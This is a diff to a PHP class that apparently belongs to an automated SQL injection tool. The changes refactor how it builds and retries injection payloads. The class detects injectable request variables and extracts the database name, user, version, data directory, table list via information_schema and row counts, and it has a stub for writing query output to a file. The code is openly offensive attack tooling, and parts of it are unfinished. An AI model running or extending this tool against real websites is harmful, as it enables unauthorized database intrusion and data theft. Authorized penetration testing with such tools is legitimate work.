@@ -92,7 +92,11 @@
 
 								$matches = $this->analyzeInjection($injection);
 
+								$this->log("GOT ".$this->_httpAdapter->getHttpCode(),0,"yellow");
+
 								if(isset($matches[0])){
+
+									$this->_isVulnerable	=	TRUE;
 
 									$this->log("FOUND SQL INJECTION!!!");
 									$this->log("Affected Variable:\t$variable");
@@ -236,20 +240,7 @@
 
 			public function getNext($fields=array()){
 
-				$totalRegisters = (int)$this->_totalRegisters;
-
-				if(!(int)$this->totalRegisters){
-					throw(new \Exception("Cant call getNext without a total of registers set!"));
-				}
-
-				if($this->_currentRegisterStep==$this->_totalRegisters){
-					return FALSE;
-				}
-
-				$limit = array($this->_currentRegisterStep.",".$this->_step);
-				$this->select($fields,$limit);
-
-				$this->_currentRegisterStep+=$this->_step;
+				//@TODO
 
 			}
 
@@ -284,10 +275,10 @@
 
 			public function getTables(){
 
-				$fieldInjection	= "GROUP_CONCAT(TABLE_NAME)";
-				$tableInjection	= "FROM information_schema.tables WHERE table_schema=DATABASE()";
+				$select	= "GROUP_CONCAT(TABLE_NAME)";
+				$from		= "FROM information_schema.tables WHERE table_schema=DATABASE()";
 
-				return $this->generateInjection($fieldInjection,$tableInjection);
+				return $this->execute($select,$from);
 
 			}
 
@@ -310,35 +301,78 @@
 
 			public function getDatabase(){
 
-				$fieldInjection	= "DATABASE()";
-				return $this->generateInjection($fieldInjection);
+				$select	= "DATABASE()";
+				return $this->execute($select);
 
+			}
+
+			protected function execute($select,$from=NULL,$useConcat=TRUE){
+
+				$this->log("Doing $select Injection",0,"light_green");
+
+				$result	=	$this->analyzeInjection($this->generateInjection($select,$from,$useConcat));
+
+				if($this->_isVulnerable){
+
+					if($result===FALSE){		//Found vulnerable however something is failing, start injection from scratch
+
+						$this->log("Something wrong is going on here, restarting the $select injection",2,"yellow");
+
+						$this->_maxFields=1;
+
+						while($this->_maxFields<=$this->_injectionAttempts){	
+
+							$result	=	$this->analyzeInjection($this->generateInjection($select,$from,$useConcat));
+
+							if(isset($result[0])){
+								return $result[0];
+							}
+
+							$this->_maxFields++;
+
+						}
+
+						return FALSE;
+
+					}
+
+				}
+
+				if(isset($result[0])){
+					return $result[0];
+				}
+
+				return FALSE;
+				
 			}
 
 			public function getUser(){
 
-				$fieldInjection	= "USER()";
-				return $this->generateInjection($fieldInjection);
+				$select	=	"USER()";
+				$user		=	$this->execute($select);
+				return $user;
 
 			}
 
 			public function getVersion(){
 
-				$fieldInjection	= "@@version";
-				return $this->generateInjection($fieldInjection);
+				$select	= "@@version";
+				return $this->execute($select);
 
 			}
 
 			public function getDatadir(){
 
-				$fieldInjection	= "@@datadir";
-
-				return $this->generateInjection($fieldInjection);
+				$select	= "@@datadir";
+				return $this->execute($select);
 
 			}
 
 			public function toFile(File $file){
-				$fieldInjection = "INTO OUT_FILE ";
+
+				$select = "INTO OUT_FILE ";
+				return $this->execute($select);
+
 			}
 
 			public function count(){
@@ -347,64 +381,12 @@
 					throw(new \Exception("Cannot get register count from unespecified table, use setTable first"));
 				}
 
-				$fieldInjection	= "COUNT(*)";
-				$tableInjection	= "FROM ".$this->_table;
-
-				return $this->generateInjection($fieldInjection,$tableInjection);
-
-			}
-
-			/**
-			 * Return a string containing proper SQL injection according to the parameters,
-			 * if no parameter is passed, by default it will use all available fields.
-			 * @param Array $fields the fields to be selected
-			 * @param Array $limit
-			 * @return String, injection string
-			 */
-
-			public function select($fields=NULL,$limit=NULL,$useTable=TRUE,$distinct=FALSE){
-
-				if(is_array($fields)){
-
-					$fields = implode($fields,",");
-
-				}else{
-
-					if(!sizeof($this->_fields)){
-
-						throw (new \Exception("Cant make SQL Injection SELECT statement without any fields"));
-
-					}
-
-					$fields = implode($this->_fields,",");
-
-				}
-
-				//@TODO
-				//We actually have to try to work around this one later hence some systems might
-				//use htmlentities or similar to escape tags!
-
-				if($distinct){
-
-					$fieldInjection	= "DISTINCT $fields";
-
-				} else {
-
-					$fieldInjection	= "$fields";
-
-				}
-
-				if($useTable){
-					$tableInjection	= "FROM ".$this->_table;
-				}
-
-				if(is_array($limit)){
-					$tableInjection.=" LIMIT ".implode($limit,",");
-				}
-
-				return $this->generateInjection($select,$from);
+				$select	= "COUNT(*)";
+				$from		= "FROM ".$this->_table;
+				return $this->execute($select,$from);
 
 			}
+
 
 			public function makeDiscoveryInjection(){
 
@@ -478,7 +460,7 @@
 			*Combines URL execution with parsing
 			*/
 
-			public function analyzeInjection($injection,$useEndingPayload=TRUE){
+			private function analyzeInjection($injection,$useEndingPayload=TRUE){
 
 				$variable	= $this->_affectedVariable;
 				$value		= $variable["value"];
@@ -503,7 +485,7 @@
 
 				}
 
-				$content			=	$this->execute($variable,$value);
+				$content	=	parent::execute($variable,$value);
 
 				if($content===FALSE){
 
@@ -511,11 +493,12 @@
 
 				}
 
-				return $this->checkInjection($content);
+				return $this->_checkInjection($content);
 
 			}
 
-			private function checkInjection($content){
+
+			private function _checkInjection($content){
 
 				$openTag		=	$this->getOpenTag();
 				$closeTag	=	$this->getCloseTag();
